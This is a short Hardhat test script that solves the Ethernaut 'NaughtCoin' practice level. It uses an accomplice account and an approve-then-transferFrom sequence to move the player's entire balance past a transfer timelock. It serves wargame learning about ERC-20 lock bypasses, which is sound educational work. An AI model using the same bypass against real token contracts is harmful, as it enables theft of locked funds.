import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let accomplice: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa, accomplice] = accounts;
  const challengeFactory = await ethers.getContractFactory(`NaughtCoin`);
  const challengeAddress = await createChallenge(
    `0x096bb5e93a204BfD701502EB6EF266a950217218`
  );
  challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {

  let eoaAddress = await eoa.getAddress()
  let accAddress = await accomplice.getAddress()
  let playerAmount = await challenge.balanceOf(await eoa.getAddress())

  await challenge.connect(eoa).approve(accAddress,playerAmount)
  await challenge.connect(accomplice).transferFrom(eoaAddress,accAddress,playerAmount)

});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
